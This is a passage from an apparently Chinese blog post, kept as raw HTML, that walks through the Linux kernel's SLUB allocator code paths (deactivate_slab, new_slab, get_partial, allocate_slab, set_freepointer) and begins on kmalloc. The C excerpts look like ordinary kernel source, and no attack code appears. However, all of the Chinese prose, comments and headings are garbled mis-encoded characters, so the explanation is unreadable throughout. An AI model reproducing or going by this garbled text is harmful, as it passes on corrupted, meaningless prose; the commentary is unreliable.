slab ä¸Šçš„æ•°é‡å¯èƒ½å‘ç”Ÿäº†æ”¹å˜.</span><br><span class="hljs-comment"> * é‡Šæ”¾é”å¹¶å†æ¬¡é‡è¯• cmpxchg.</span><br><span class="hljs-comment"> */</span><br>redo:<br><br>old.freelist = READ_ONCE(slab-&gt;freelist);<br>old.counters = READ_ONCE(slab-&gt;counters);<br>VM_BUG_ON(!old.frozen);<br><br><span class="hljs-comment">/* ç¡®å®š slab çš„ç›®æ ‡çŠ¶æ€ */</span><br>new.counters = old.counters;<br><span class="hljs-keyword">if</span> (freelist_tail) &#123;<br>new.inuse -= free_delta;<br>set_freepointer(s, freelist_tail, old.freelist);<br>new.freelist = freelist;<br>&#125; <span class="hljs-keyword">else</span><br>new.freelist = old.freelist;<br><br>new.frozen = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;<br>mode = M_FREE;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.freelist) &#123;<br>mode = M_PARTIAL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æŒæœ‰è‡ªæ—‹é”æ¶ˆé™¤äº†acquire_slab()çœ‹åˆ°ä¸€ä¸ªslabä¸ºå†»ç»“çš„å¯èƒ½æ€§</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mode = M_FULL_NOLIST;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!cmpxchg_double_slab(s, slab,<br>old.freelist, old.counters,<br>new.freelist, new.counters,<br><span class="hljs-string">&quot;unfreezing slab&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (mode == M_PARTIAL)<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (mode == M_PARTIAL) &#123;<br>add_partial(n, slab, tail);<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, tail);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FREE) &#123;<br>stat(s, DEACTIVATE_EMPTY);<br>discard_slab(s, slab);<br>stat(s, FREE_SLAB);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FULL_NOLIST) &#123;<br>stat(s, DEACTIVATE_FULL);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘£-new-slabï¼šè·å–-percpu-partial-slab"><a href="#â‘£-new-slabï¼šè·å–-percpu-partial-slab" class="headerlink" title="â‘£ new_slabï¼šè·å– percpu partial slab"></a>â‘£ new_slabï¼šè·å– percpu partial slab</h4><p>æ¥ä¸‹æ¥æ˜¯ <code>new_slab</code> æ ‡ç­¾ï¼Œä¸»è¦å°±æ˜¯æ£€æŸ¥è‹¥æœ‰ percpu partial slab åˆ™ä» percpu partial é“¾è¡¨ä¸Šè·å–ä¸€ä¸ª slab å°†å…¶è®¾ä¸º percpu slab å å†è·³è½¬å› <code>redo</code> æ ‡ç­¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">new_slab:<br><br><span class="hljs-keyword">if</span> (slub_percpu_partial(c)) &#123;<span class="hljs-comment">//æœ‰ percpu partial slab</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<span class="hljs-comment">//percpu slab ä¸ä¸ºç©ºï¼Œç›´æ¥è·³å› redo</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;<span class="hljs-comment">//è¢«æŠ¢å ç„¶åpartialç©ºäº†</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-comment">/* æˆ‘ä»¬è¢«æŠ¢å äº†ä¸” partial é“¾è¡¨ç©ºäº† */</span><br><span class="hljs-keyword">goto</span> new_objects;<br>&#125;<br><br><span class="hljs-comment">// è·å–ä¸€å¼  percpu patial slabï¼Œè·³å› redo</span><br>slab = c-&gt;slab = slub_percpu_partial(c);<br>slub_set_percpu_partial(c, slab);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, CPU_PARTIAL_ALLOC);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘¤-new-objectsï¼šè·å–-node-pertial-slab-æˆ–å‘-buddy-è¯·æ±‚æ–°-slab-è¿›è¡Œåˆ†é…"><a href="#â‘¤-new-objectsï¼šè·å–-node-pertial-slab-æˆ–å‘-buddy-è¯·æ±‚æ–°-slab-è¿›è¡Œåˆ†é…" class="headerlink" title="â‘¤ new_objectsï¼šè·å– node pertial slab æˆ–å‘ buddy è¯·æ±‚æ–° slab è¿›è¡Œåˆ†é…"></a>â‘¤ new_objectsï¼šè·å– node pertial slab æˆ–å‘ buddy è¯·æ±‚æ–° slab è¿›è¡Œåˆ†é…</h4><p>è‹¥ percpu partial é“¾è¡¨ä¹Ÿä¸ºç©ºï¼Œé‚£ä¹ˆä¾¿æ¥åˆ°æ¥ä¸‹æ¥çš„ <code>new_objects</code> æ ‡ç­¾åˆ†é…ä¸€ä¸ªæ–°çš„ slabï¼Œé¦–å…ˆä¼šè®¾ç½® <code>partial_context</code>ï¼Œè°ƒç”¨ <code>get_partial()</code> å°è¯•ä» <code>kmem_cache_node</code> çš„ partial é“¾è¡¨åˆ†é…ä¸€ä¸ª slabï¼Œè‹¥åˆ†é…æˆåŠŸåˆ™ç›´æ¥è·³è½¬åˆ° <code>check_new_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">new_objects:<br><br>pc.flags = gfpflags;<br>pc.slab = &amp;slab;<br>pc.orig_size = orig_size;<br>freelist = get_partial(s, node, &amp;pc);<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> check_new_slab;<br><br></code></pre></td></tr></table></figure><p><code>get_partial()</code> é¦–å…ˆä¼šè°ƒç”¨ <code>get_partial_node()</code> ä»å½“å‰ node çš„ <code>kmem_cache_node</code> çš„ partial é“¾è¡¨åˆ†é… slabï¼Œè‹¥æˆåŠŸäº†åˆ™ç›´æ¥è¿”å›ï¼Œå¦‚æœå¤±è´¥äº†ä½†æ˜¯æŒ‡å®šäº†åˆ†é…çš„ node ä¸º <code>NUMA_NO_NODE</code>ï¼Œåˆ™è°ƒç”¨ <code>get_any_partial()</code> ä»å…¶ä»–çš„ <code>kmem_cache_node</code> çš„ partial é“¾è¡¨å°è¯•åˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è·å–ä¸€ä¸ª partial slab, åŠ é”å¹¶è¿”å›.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_partial</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">int</span> node, <span class="hljs-keyword">struct</span> partial_context *pc)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">int</span> searchnode = node;<br><br><span class="hljs-keyword">if</span> (node == NUMA_NO_NODE)<br>searchnode = numa_mem_id();<br><br><span class="hljs-comment">// ä»å½“å‰ node çš„ partial é“¾è¡¨åˆ†é… slab</span><br>object = get_partial_node(s, get_node(s, searchnode), pc);<br><span class="hljs-keyword">if</span> (object || node != NUMA_NO_NODE)<br><span class="hljs-keyword">return</span> object;<br><br><span class="hljs-comment">// ä»å…¶ä»– node çš„ partial é“¾è¡¨åˆ†é… slab</span><br><span class="hljs-keyword">return</span> get_any_partial(s, pc);<br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥ <code>get_partial()</code> æ²¡æ³•è·å–åˆ° slabï¼Œåˆ™è°ƒç”¨ <code>new_slab()</code> å‘ buddy system è¯·æ±‚ä¸€ä»½æ–°çš„ slabï¼Œè‹¥å¤±è´¥äº†åˆ™ç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">slub_put_cpu_ptr(s-&gt;cpu_slab);<br>slab = new_slab(s, gfpflags, node);<br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>slab_out_of_memory(s, gfpflags, node);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>stat(s, ALLOC_SLAB);<br></code></pre></td></tr></table></figure><p><code>new_slab()</code> æœ€åä¼šè°ƒç”¨åˆ° <code>allocate_slab()</code>ï¼š</p><ul><li>é¦–å…ˆæ£€æŸ¥é¡µé¢åˆ†é…æ ‡å¿—ä½ï¼Œä¹‹åè°ƒç”¨ <code>alloc_slab_page()</code> åœ¨æŒ‡å®š node ä¸Šè¿›è¡Œåˆ†é…<ul><li>è‹¥ <code>node == NUMA_NO_NODE</code>ï¼Œåˆ™è¯¥å‡½æ•°ä¼šè°ƒç”¨ <code>alloc_pages()</code>ï¼Œå¦åˆ™ä¼šè°ƒç”¨ <code>__alloc_pages_node()</code></li></ul></li><li>è‹¥å¤±è´¥äº†åˆ™å†æ¬¡è°ƒç”¨  <code>alloc_slab_page()</code>  å°è¯•è¿›è¡Œæœ€å°å†…å­˜åˆ†é…ï¼ˆ<code>kmem_cache-&gt;min</code>ï¼‰ï¼Œä»å¤±è´¥åˆ™ç›´æ¥è¿”å› NULL</li><li>åˆå§‹åŒ– slab å„æˆå‘˜ï¼Œå¹¶è°ƒç”¨ <code>shuffle_freelist()</code> ä¸ºç©ºé—²å¯¹è±¡æ„é€ éšæœºåŒ–é“¾è¡¨ï¼Œè‹¥æœªå¼€å¯éšæœºåŒ–åˆ™å°†ç©ºé—²å¯¹è±¡æŒ‰é¡ºåºè¿æ¥</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<span class="hljs-title function_">allocate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span> =</span> s-&gt;oo;<br><span class="hljs-type">gfp_t</span> alloc_gfp;<br><span class="hljs-type">void</span> *start, *p, *next;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">bool</span> shuffle;<br><br>flags &amp;= gfp_allowed_mask;<br><br>flags |= s-&gt;allocflags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è®©æœ€åˆçš„ higher-order åˆ†é…åœ¨å†…å­˜å‹åŠ›ä¸‹å¤±è´¥</span><br><span class="hljs-comment"> * ç”±æ­¤æˆ‘ä»¬è¿”å›åˆ°æœ€å° order çš„åˆ†é….</span><br><span class="hljs-comment"> */</span><br>alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;<br><span class="hljs-keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))<br>alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;<br><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<span class="hljs-comment">//åˆ†é…å¤±è´¥ï¼Œå°è¯•æœ€å°å†…å­˜åˆ†é…</span><br>oo = s-&gt;min;<br>alloc_gfp = flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åˆ†é…å¯èƒ½å› ä¸ºç¢ç‰‡åŒ–è€Œå¤±è´¥.</span><br><span class="hljs-comment"> * å¯èƒ½çš„è¯å°è¯•ä¸€ä¸ª lower order çš„åˆ†é…</span><br><span class="hljs-comment"> */</span><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>stat(s, ORDER_FALLBACK);<br>&#125;<br><br>slab-&gt;objects = oo_objects(oo);<br>slab-&gt;inuse = <span class="hljs-number">0</span>;<br>slab-&gt;frozen = <span class="hljs-number">0</span>;<br><br>account_slab(slab, oo_order(oo), s, flags);<br><br>slab-&gt;slab_cache = s;<br><br>kasan_poison_slab(slab);<br><br>start = slab_address(slab);<br><br>setup_slab_debug(s, slab, start);<br><br><span class="hljs-comment">//å¼€å¯äº†éšæœºåŒ–ä¼šåœ¨è¯¥å‡½æ•°å†…éšæœºè¿æ¥</span><br>shuffle = shuffle_freelist(s, slab);<br><br><span class="hljs-comment">//æœªå¼€å¯éšæœºåŒ–ï¼ŒæŒ‰é¡ºåºè¿æ¥</span><br><span class="hljs-keyword">if</span> (!shuffle) &#123;<br>start = fixup_red_left(s, start);<br>start = setup_object(s, start);<br>slab-&gt;freelist = start;<br><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="hljs-number">1</span>; idx++) &#123;<br>next = p + s-&gt;size;<br>next = setup_object(s, next);<br>set_freepointer(s, p, next);<br>p = next;<br>&#125;<br>set_freepointer(s, p, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> slab;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†ä¸€ä¸ªå‡½æ•° <code>set_freepointer()</code>ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>freelist_ptr()</code> å‘ <code>object + s-&gt;offset</code> çš„ä½ç½®å†™å…¥ç”¨ <code>freelist_ptr()</code> åŠ å¯†åçš„ <code>fp</code> æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_freepointer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *object, <span class="hljs-type">void</span> *fp)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)object + s-&gt;offset;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br>BUG_ON(object == fp); <span class="hljs-comment">/* naive detection of double free or corruption */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)freeptr_addr);<br>*(<span class="hljs-type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿”å› <code>___slab_alloc()</code>ï¼Œå¦‚æœ<strong>è¯¥ kmem_cache è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½</strong>ï¼Œåˆ™æ¥ä¸‹æ¥ä¼šè°ƒç”¨ <code>alloc_single_from_new_slab()</code> <strong>ä»æ–°è·å–åˆ°çš„ slab ä¸Šåˆ†é…ä¸€ä¸ªå¯¹è±¡åå°† slab é‡æ–°æŒ‚å› partial&#x2F;full é“¾è¡¨</strong>ï¼Œè‹¥åˆ†é…å¤±è´¥åˆ™è·³è½¬å› <code>new_objects</code>ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br>freelist = alloc_single_from_new_slab(s, slab, orig_size);<br><br><span class="hljs-keyword">if</span> (unlikely(!freelist))<br><span class="hljs-keyword">goto</span> new_objects;<br><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰è®¾ç½® <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½ï¼Œåˆ™æ¥ä¸‹æ¥è·å– slab çš„ freelistï¼Œå¹¶è°ƒç”¨ <code>inc_slabs_node()</code> å¢åŠ  node ä¸Šçš„è®¡æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * No other reference to the slab yet so we can</span><br><span class="hljs-comment"> * muck around with it freely without cmpxchg</span><br><span class="hljs-comment"> */</span><br>freelist = slab-&gt;freelist;<br>slab-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>slab-&gt;inuse = slab-&gt;objects;<br>slab-&gt;frozen = <span class="hljs-number">1</span>;<br><br>inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);<br></code></pre></td></tr></table></figure><h4 id="â‘¥-check-new-slabï¼šæ£€æŸ¥-slab"><a href="#â‘¥-check-new-slabï¼šæ£€æŸ¥-slab" class="headerlink" title="â‘¥ check_new_slabï¼šæ£€æŸ¥ slab"></a>â‘¥ check_new_slabï¼šæ£€æŸ¥ slab</h4><p>æ¥ä¸‹æ¥å¯¹æ–°è·å–çš„ slab è¿›è¡Œæ£€æŸ¥ï¼Œè‹¥è¯¥ kmem_cache è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½ï¼Œæ£€æŸ¥æ˜¯å¦è®¾ç½®äº† <code>SLAB_STORE_USER</code> æ ‡å¿—ä½ï¼Œä¹‹åç›´æ¥è¿”å› freelist</p><p>æ¥ä¸‹æ¥è°ƒç”¨ <code>pfmemalloc_match()</code> æ£€æŸ¥ slab ä¸åˆ†é…æ ‡å¿—ä½æ˜¯å¦ä¸åŒ¹é…ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>deactivate_slab()</code> ä½¿å…¶ä¸å†æ´»åŠ¨å¹¶è¿”å› freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">check_new_slab:<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For debug caches here we had to go through</span><br><span class="hljs-comment"> * alloc_single_from_partial() so just store the tracking info</span><br><span class="hljs-comment"> * and return the object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span><br><span class="hljs-comment"> * we don&#x27;t make further mismatched allocations easier.</span><br><span class="hljs-comment"> */</span><br>deactivate_slab(s, slab, get_freepointer(s, freelist));<br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="â‘¦-retry-load-slabï¼š"><a href="#â‘¦-retry-load-slabï¼š" class="headerlink" title="â‘¦ retry_load_slabï¼š"></a>â‘¦ retry_load_slabï¼š</h4><p>æœ€åå°±æ˜¯å°è¯•åŠ è½½æ–°è·å¾—çš„ slabï¼Œå¦‚æœ percpu slab ä¸ä¸º NULL åˆ™ä½¿å…¶ä¸å†æ´»åŠ¨ï¼Œå¹¶è®¾ç½® percpu slab &amp; freelist ä¸º NULLï¼Œå¹¶è·å–ä¸‹ä¸€ä¸ª tid</p><p>æœ€åå°±æ˜¯å°† percpu slab è®¾ä¸ºæ–°è·å–çš„ slab å¹¶è·³è½¬å› <code>load_freelist</code> åˆ†é…å¯¹è±¡å¹¶è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_load_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<br><span class="hljs-type">void</span> *flush_freelist = c-&gt;freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">flush_slab</span> =</span> c-&gt;slab;<br><br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><br>deactivate_slab(s, flush_slab, flush_freelist);<br><br>stat(s, CPUSLAB_FLUSH);<br><br><span class="hljs-keyword">goto</span> retry_load_slab;<br>&#125;<br>c-&gt;slab = slab;<br><br><span class="hljs-keyword">goto</span> load_freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ slub åˆ†é…ç®—æ³•çš„æ ¸å¿ƒé€»è¾‘åˆ†æç»“æŸ</p><h2 id="äºŒã€kmallocï¼š-NUMA-NO-NODE-çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£"><a href="#äºŒã€kmallocï¼š-NUMA-NO-NODE-çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£" class="headerlink" title="äºŒã€kmallocï¼š NUMA_NO_NODE çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£"></a>äºŒã€kmallocï¼š NUMA_NO_NODE çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£</h2><p>æˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼ˆï¼Ÿï¼‰æœ€å¸¸ç”¨çš„å…¶å®è¿˜æ˜¯ <code>kmalloc()</code>ï¼Œå…¶ä¼šæ ¹æ®åˆ†é…çš„å¤§å°ä¸æ ‡å¿—ä½å¸®æˆ‘ä»¬å®Œæˆ <code>kmem_cache</code> çš„é€‰å–å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…</p><p>å‡½æ•°æ•´ä½“é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>è‹¥åˆ†é…çš„å¤§å°åœ¨ç¼–è¯‘æœŸå·²çŸ¥ï¼ˆ<code>__builtin_constant_p()</code>ï¼‰åˆ™åˆ¤æ–­å¤§å°ï¼š<ul><li>è‹¥å¤§å°å¤§äº <code>KMALLOC_MAX_CACHE_SIZE</code> åˆ™ä½¿ç”¨ <code>kmalloc_large()</code> è¿›è¡Œåˆ†é…</li><li>é€šè¿‡ <code>kmalloc_index()</code> ä¸ <code>kmalloc_type()</code> è·å– <code>kmalloc_caches</code> ä¸­å¯¹åº”çš„æ•°ç»„ä¸‹æ ‡å¹¶è°ƒç”¨ <code>kmalloc_trace</code> è¿›è¡Œå¯¹è±¡åˆ†é…</li></ul></li><li>è‹¥å¤§å°æ˜¯åŠ¨æ€ä¼ å…¥çš„ï¼Œè°ƒç”¨ <code>__kmalloc()</code> è¿›è¡Œåˆ†é…</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 